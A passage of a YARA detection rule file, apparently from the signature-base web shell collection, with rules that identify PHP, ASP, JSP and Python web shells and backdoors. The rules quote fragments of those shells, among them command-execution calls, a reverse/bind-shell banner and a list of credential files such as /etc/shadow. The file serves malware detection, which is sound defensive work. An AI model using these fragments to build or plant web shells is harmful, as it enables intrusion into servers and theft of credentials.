		$s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
		$s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
		$s2 = "dim zombie_array,special_array"
		$s3 = "http://vnhacker.org"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Indexer_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file indexer.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "84ff60f9-36f7-5d29-9f38-8088fb42582e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4385-L4396"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9ea82afb8c7070817d4cdf686abe0300"
		logic_hash = "0a51f15bfb4289dcb70e1e0b96d100be12901ebf26ed9c0e543eda5f4aa91f1c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
		$s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dxshell_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file DxShell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b89930b7-acf3-5078-8429-d59e27e4b00c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4397-L4408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "33a2b31810178f4c2e71fbdeb4899244"
		logic_hash = "821f9295eba6119ad08349e769d1909cd7836b4e35795915e94095cf715dc6e5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"

	condition:
		1 of them
}

rule SIGNATURE_BASE_S72_Shell_V1_1_Coding_Html_2
{
	meta:
		description = "Semi-Auto-generated  - file s72 Shell v1.1 Coding.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "dfd3b80e-6245-5f74-9d6a-6006218891ac"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4409-L4421"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c2e8346a5515c81797af36e7e4a3828e"
		logic_hash = "aef8840b72e5c435c11150007d6b3af2943126fefdc6df343d0f73755340e260"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
		$s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
		$s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""

	condition:
		1 of them
}

rule SIGNATURE_BASE_Kacak_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file kacak.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1ae15174-b84a-5826-b768-7afed65196db"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4422-L4435"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "907d95d46785db21331a0324972dda8c"
		logic_hash = "8542a3985dff2d1eb42f4d2c9f30405a4817a8e30075225c518ec52381f1f7df"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Kacak FSO 1.0"
		$s1 = "if request.querystring(\"TGH\") = \"1\" then"
		$s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
		$s4 = "mailto:BuqX@hotmail.com"

	condition:
		1 of them
}

rule SIGNATURE_BASE_PHP_Backdoor_Connect_Pl_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file PHP Backdoor Connect.pl.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "96c9258e-3894-5ee9-b52c-eb7ba7454416"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4436-L4448"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "57fcd9560dac244aeaf95fd606621900"
		logic_hash = "b141546f45767884f9c8b1cc4c09ea25f90c0f3a3633bfeecad78b60e7f20306"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "LorD of IRAN HACKERS SABOTAGE"
		$s1 = "LorD-C0d3r-NT"
		$s2 = "echo --==Userinfo==-- ;"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Antichat_Socks5_Server_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Antichat Socks5 Server.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "35d0930c-ef07-5fd4-9d7a-c0d685f92339"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4449-L4461"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cbe9eafbc4d86842a61a54d98e5b61f1"
		logic_hash = "d6b203561f95f431b3d2c241011ae08c05619d45c5900a28137481c029e8297e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
		$s3 = "#   [+] Domain name address type"
		$s4 = "www.antichat.ru"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Antichat_Shell_V1_3_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Antichat Shell v1.3.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "856cf977-24da-58e0-b6d2-820c92075ecc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4462-L4474"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "40d0abceba125868be7f3f990f031521"
		logic_hash = "566c324f3bf44ce9f32ddad82a8d3daa87a8a75b5ca0c8286bc912a8ae4ac8e9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Antichat"
		$s1 = "Can't open file, permission denide"
		$s2 = "$ra44"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3e81f628-31b4-5c22-943e-62c8cb4c0c4d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4475-L4487"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "49ad9117c96419c35987aaa7e2230f63"
		logic_hash = "d6d2a3999f2e8ceb70f57697c0a845edbbcfce0aba151ec6a0ac23f55265cd47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
		$s1 = "Mode Shell v1.0</font></span>"
		$s2 = "has been already loaded. PHP Emperor <xb5@hotmail."

	condition:
		1 of them
}

rule SIGNATURE_BASE_Mysql_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file mysql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4488-L4500"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "12bbdf6ef403720442a47a3cc730d034"
		logic_hash = "60e235310f378698ffcc3ae6a07ab5dd94a660ca4b1504cc878d9741f751d5d1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "action=mysqlread&mass=loadmass\">load all defaults"
		$s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Worse_Linux_Shell_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Worse Linux Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e223e2a9-7c7a-597a-8b90-a63ee11805ea"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4501-L4512"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
		logic_hash = "47801296b700e85f9e08857eb06f845ef8ed3f88b7d0de34d4b7c47cef6cc7fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
		$s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cyberlords_Sql_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file cyberlords_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4513-L4526"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "03b06b4183cb9947ccda2c3d636406d4"
		logic_hash = "b3286f9fd86c90c5afc79801b6d65c9ae52ee1c37da93ff15461d84f37ef8019"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Coded by n0 [nZer0]"
		$s1 = " www.cyberlords.net"
		$s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
		$s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmd_Asp_5_1_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file cmd-asp-5.1.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fc204ab8-892d-5435-a737-a185ca32e938"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4527-L4538"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
		logic_hash = "a41c83da1a65e67b6f4ac6ad7cc8702486957ab0c7dda658d071e603338c324b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
		$s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Pws_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file pws.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1ec47c33-dbec-50bd-b4b0-8f00b704a816"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4539-L4551"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ecdc6c20f62f99fa265ec9257b7bf2ce"
		logic_hash = "98dae8aab5bfd58f4264e318f5a5b5900b38687386f9d7f09c31da0f51d57bc0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
		$s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
		$s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_PHP_Shell_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file PHP Shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6978126c-5414-52d2-b085-6e5589716d93"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4552-L4563"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
		logic_hash = "2d5b6e08bfe9e1551dab12b01189dadc924c097427c996684bab96c48d528395"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="

	condition:
		all of them
}

rule SIGNATURE_BASE_Ayyildiz_Tim___AYT__Shell_V_2_1_Biz_Html_2
{
	meta:
		description = "Semi-Auto-generated  - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d50a8669-fd28-59d2-9f00-f4fe2b85dc22"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4564-L4577"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8a8c8bb153bd1ee097559041f2e5cf0a"
		logic_hash = "9e2d56b49df65a2c13e15f97ec91cdbb6852d86e86f921d7c8a4db82cbea12f5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Ayyildiz"
		$s1 = "TouCh By iJOo"
		$s2 = "First we check if there has been asked for a working directory"
		$s3 = "http://ayyildiz.org/images/whosonline2.gif"

	condition:
		2 of them
}

rule SIGNATURE_BASE_EFSO_2_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file EFSO_2.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "f0566790-b41c-5167-b7ec-19e7d04256d1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4578-L4589"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b5fde9682fd63415ae211d53c6bfaa4d"
		logic_hash = "15e5419854bcbb08f28fff1e266cca7a004f01ec0a5c313c107ec17c3aa7ffee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Ejder was HERE"
		$s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Lamashell_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file lamashell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cbbb3377-ef9c-5fd1-a8b8-2b730fb5ef28"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4590-L4602"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "de9abc2e38420cad729648e93dfc6687"
		logic_hash = "5e156c3057338fa7b306b91dd979851dd56b8b698cfe99e1d7b6d096a4c580e7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "lama's'hell" fullword
		$s1 = "if($_POST['king'] == \"\") {"
		$s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ajax_PHP_Command_Shell_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Ajax_PHP Command Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cae2e035-ae7b-589b-b2d9-e709028274c5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4603-L4615"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "93d1a2e13a3368a2472043bd6331afe9"
		logic_hash = "37cba26018f3d37194a143871012a61a7bcee6775d2cf5f93a52b779010d3260"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
		$s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
		$s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Jspwebshell_1_2_Jsp_2
{
	meta:
		description = "Semi-Auto-generated  - file JspWebshell 1.2.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "edfe6a3d-7d56-52ad-a376-cec5722e87b7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4616-L4629"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70a0ee2624e5bbe5525ccadc467519f6"
		logic_hash = "32b3ddb00f89a3540118fe8ce5fc070556b00030dcf2b21245d38ae66e6cbc14"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "JspWebshell"
		$s1 = "CreateAndDeleteFolder is error:"
		$s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
		$s3 = "String _password =\"111\";"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Sincap_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Sincap.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8c4dc7b1-94ce-5528-8442-eae05d2c9980"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4630-L4642"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b68b90ff6012a103e57d141ed38a7ee9"
		logic_hash = "e708a7dcb26ff7d0208c1f092e14e701f2ae94c4ffca019f13064bbe04ef74d7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
		$s2 = "$tampon4=$tampon3-1"
		$s3 = "@aventgrup.net"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Phyton_Shell_Py_2
{
	meta:
		description = "Semi-Auto-generated  - file Phyton Shell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "2f55d60d-94f3-508d-a2d0-5ab59e3fdab3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4656-L4669"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "92b3c897090867c65cc169ab037a0f55"
		logic_hash = "ac16a95cd1fb09c93b315e3cd7d57c1ebec322b641f515854fb73a61393dd365"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
		$s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
		$s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
		$s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Mysql_Tool_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file mysql_tool.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c67197d1-6e40-5bf2-9e1b-6ada43529435"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4670-L4682"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5fbe4d8edeb2769eda5f4add9bab901e"
		logic_hash = "9f49bd6c56c919f678ecada82ff3d801c82c98a8abdee85cda1ec7e5b6756012"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
		$s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
		$s4 = "<div align=\"center\">The backup process has now started<br "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Zehir_4_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file Zehir 4.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ea7df4e1-d4e2-5a58-a014-d12cb9afaf79"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4683-L4694"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7f4e12e159360743ec016273c3b9108c"
		logic_hash = "69063d866daf1709df81fa22d76177bf8d552e19725a94db4a1b2fca79387faf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
		$s4 = "<input type=submit value=\"Test Et!\" onclick=\""

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sh_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4695-L4706"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "330af9337ae51d0bac175ba7076d6299"
		logic_hash = "b0c3307d451e5d7dadece114e2888503a46038e2edb2ff32bf566ce47b300e76"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
		$s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpbackdoor15_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file phpbackdoor15.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "a93b881b-3050-5f43-803c-4a571aaaef82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4707-L4719"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0fdb401a49fc2e481e3dfd697078334b"
		logic_hash = "cdd105f36593e8326ca32bf7cf1fba6fb754e7305c91fe6c078323db8f59b23c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
		$s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
		$s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpjackal_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file phpjackal.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ae46cb97-1ff8-50ba-856f-c38fbb1e5163"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4720-L4731"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ab230817bcc99acb9bdc0ec6d264d76f"
		logic_hash = "6e2ff262aecd08e5feaa274a7fd128d75565d6cc03341da7cbeb2949070705e5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "$dl=$_REQUEST['downloaD'];"
		$s4 = "else shelL(\"perl.exe $name $port\");"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cgi_Python_Py_2
{
	meta:
		description = "Semi-Auto-generated  - file cgi-python.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "75e99d10-3cdf-5f87-9933-4ce5ebe18b09"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4745-L4757"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0a15f473e2232b89dae1075e1afdac97"
		logic_hash = "37c6c7db32a52c8a83ff85f0a50c6fa71e833b9e6d20b1f95e9512fe8bbd0aee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "a CGI by Fuzzyman"
		$s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
		$s2 = "values = map(lambda x: x.value, theform[field])     # allows for"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ru24_Post_Sh_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file ru24_post_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "78669d3e-629b-591a-a766-923e37d1fdba"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4758-L4770"
